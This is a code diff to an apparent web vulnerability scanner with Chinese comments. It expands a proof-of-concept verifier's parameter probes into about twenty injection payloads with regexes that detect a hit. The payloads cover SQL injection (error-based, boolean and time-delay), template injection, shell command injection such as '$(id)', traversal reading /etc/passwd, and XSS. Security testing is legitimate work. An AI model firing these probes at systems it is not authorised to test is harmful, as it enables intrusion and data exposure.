@@ -23,8 +23,30 @@ from .http_client import http_request
 from .leak_exploit import extract_followups
 
 _SUFFIXES = (".bak", ".old", ".txt", ".save", ".swp", ".orig", ".copy", "~", ".1")
-_PROBE_VALUES = ("1'", "../../etc/passwd", "{{7*7}}", "${7*7}", "<script>alert(1)</script>")
-_MAX_VARIANTS = 80
+# 探测值变体：(payload, 自动命中判定正则)。expect 为空时仅靠 match_regex/响应差异判定。
+_PROBE_VALUES = (
+    ("1'", r"(SQL|syntax|unterminated|quote|mysql|odbc|jdbc|sqlite)"),
+    ("1' AND extractvalue(1,concat(0x7e,user()))-- ", r"XPATH syntax error"),
+    ("1' AND updatexml(1,concat(0x7e,database()),1)-- ", r"XPATH syntax error"),
+    ("1 AND (SELECT 1 FROM (SELECT count(*),concat(floor(rand(0)*2),user())x FROM information_schema.tables GROUP BY x)a)", r"Duplicate entry"),
+    ("-1 OR 1=1-- ", ""),
+    ("' OR 1=1-- ", ""),
+    ("1' AND IF(1=1,sleep(4),0)-- ", ""),
+    ("1';WAITFOR DELAY '0:0:4'-- ", ""),
+    ("%df%27 OR 1=1-- ", ""),
+    ("{{7*7}}", r"\b49\b"),
+    ("${7*7}", r"\b49\b"),
+    ("; id", r"uid=\d+"),
+    ("| id", r"uid=\d+"),
+    ("$(id)", r"uid=\d+"),
+    ("` id `", r"uid=\d+"),
+    ("cat$IFS/etc/passwd", r"root:[x*]:0:0"),
+    ("../../etc/passwd", r"root:[x*]:0:0"),
+    ("<script>alert(1)</script>", r"<script>alert\(1\)"),
+    ("<svg onload=alert(1)>", r"<svg onload"),
+    ("1%2527", ""),
+)
+_MAX_VARIANTS = 120
 
 
 @dataclass
@@ -34,6 +56,7 @@ class PocSpec:
     headers: dict = field(default_factory=dict)
     body: str = ""
     match_regex: str = ""          # 命中判定正则（用户提供）
+    expect_regex: str = ""         # 探针自带预期证据正则（match_regex 缺省时兜底）
     note: str = ""
 
 
@@ -70,12 +93,12 @@ def expand_variants(poc: PocSpec) -> list[PocSpec]:
     out: list[PocSpec] = []
     seen = {poc.url}
 
-    def add(u: str, note: str):
+    def add(u: str, note: str, expect: str = ""):
         if u not in seen and len(out) < _MAX_VARIANTS:
             seen.add(u)
             out.append(PocSpec(url=u, method=poc.method, headers=dict(poc.headers),
                                body=poc.body, match_regex=poc.match_regex,
-                               note=note))
+                               expect_regex=expect, note=note))
 
     split = urlsplit(poc.url)
     base = f"{split.scheme}://{split.netloc}"
@@ -98,14 +121,15 @@ def expand_variants(poc: PocSpec) -> list[PocSpec]:
         flipped = segments[:i] + [segments[i].swapcase()] + segments[i + 1:]
         add(f"{base}/" + "/".join(flipped), f"大小写变体 #{i + 1}")
 
-    # 4) 参数值变体（高危探测值）
+    # 4) 参数值变体（攻击探测探针，payload+预期证据）
     if split.query:
         pairs = parse_qsl(split.query, keep_blank_values=True)
-        for probe in _PROBE_VALUES:
+        for probe, expect in _PROBE_VALUES:
             new_pairs = [(k, probe) for k, _ in pairs[:3]] or \
                 [(pairs[0][0] if pairs else "id", probe)]
             q = urlencode(new_pairs)
-            add(f"{base}{path}?{q}", f"参数值变体 {probe[:20]}")
+            add(f"{base}{path}?{q}", f"探针 {probe[:24]}",
+                expect=expect)
 
     # 5) 编码变体（对路径最后一段）
     if filename:
@@ -170,9 +194,10 @@ async def _verify(poc: PocSpec) -> dict:
                            data=poc.body or None, timeout=10)
     reachable = r.status != 0
     hit = False
-    if reachable and poc.match_regex:
+    rule = poc.match_regex or poc.expect_regex
+    if reachable and rule:
         try:
-            hit = re.search(poc.match_regex, r.text or "", re.IGNORECASE) is not None
+            hit = re.search(rule, r.text or "", re.IGNORECASE) is not None
         except re.error:
             hit = False
     snippet = (r.text or "")[:400].replace("\n", " ")
